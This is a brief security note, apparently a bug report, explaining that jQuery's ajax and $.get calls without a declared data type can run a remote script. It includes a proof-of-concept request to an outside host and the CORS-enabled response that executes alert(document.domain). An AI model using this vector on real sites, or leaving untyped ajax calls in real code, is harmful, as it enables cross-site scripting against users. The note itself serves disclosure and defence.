It is dangerous to use jQuery's ajax function without specifying the expected data type. Attacker can supply a remote js file to achieve XSS. This can be addressed by specifying the data type to be JSON

```
$.get('https://innerht.ml/vectors/js.php')
```

https://innerht.ml/vectors/js.php
```
access-control-allow-credentials:true
access-control-allow-origin:https://jquery.com

alert(document.domain);
```
